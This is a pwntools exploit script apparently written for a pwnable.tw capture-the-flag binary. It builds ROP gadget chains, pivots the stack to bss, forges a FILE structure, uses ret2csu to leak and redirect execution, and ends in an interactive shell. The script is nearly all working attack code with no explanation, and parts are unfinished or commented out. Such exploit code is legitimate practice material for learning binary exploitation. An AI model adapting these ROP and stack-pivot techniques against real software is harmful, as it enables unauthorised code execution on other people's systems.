from pwn import *


r = process('./D',env={"LD_PRELOAD" : "./libc-2.23.so"})
#r = remote('chall.pwnable.tw',10400)

### gadget 
pop_rbp_ret = 0x4004a0
pop_rdi_ret = 0x4005c3
pop_r12_pop3_ret = 0x4005bc
pop_rsi_pop_r15_ret = 0x4005c1
leave_ret = 0x400554
pop_r13_r14_r15_ret = 0x4005be
call_r12 = 0x4005a9 

main_addr = 0x400536
got_addr = 0x600fe0
fake_file_addr = 0x601530

## change gets' stack to bss secton 
'''
ret2csu

r13 -> rdx 
r14 -> rsi
r15d -> edi
'''


r.sendline(b'\x00'* 0x10 + p64(0x601500) + p64(0x40053e)) 
payload = p64(0x40053e) * 2 + p64(0x6014d8) + p64(0x40053e) * 5
fake_file = p64(0x40053e)*14 + p64(1) + p64(0) * 8 + p64(0x601400) + p64(0x40053e) ## fd = stdout = 1
r.sendline(payload + fake_file)  ### leave some value at bss 

### prepare for ret2csu
payload = p64(0)
payload += p64(main_addr)  ## re2csu ret addr 0x6014d0
payload += p64(0) * 2
payload += p64(pop_rbp_ret)
payload += p64(0x6015e8)
payload += p64(leave_ret)


r.sendline(payload)


# rop = p64(pop_r13_r14_r15_ret)
# rop += p64(0x50) 
# rop += p64(got_addr)
# rop += p64(0x601000)
# rop += p64(call_r12)
# rop = rop.ljust(0x90,b'\x00')
rop = b''
payload = p64(0) *2
payload += p64(0x601200)
payload += p64(0x4005ba) #ret2csu
payload += p64(0xffffffffffcb5370) # rbx
payload += p64(0x601200) # rbp
payload = rop + payload 
input()
r.sendline(payload )

r.interactive()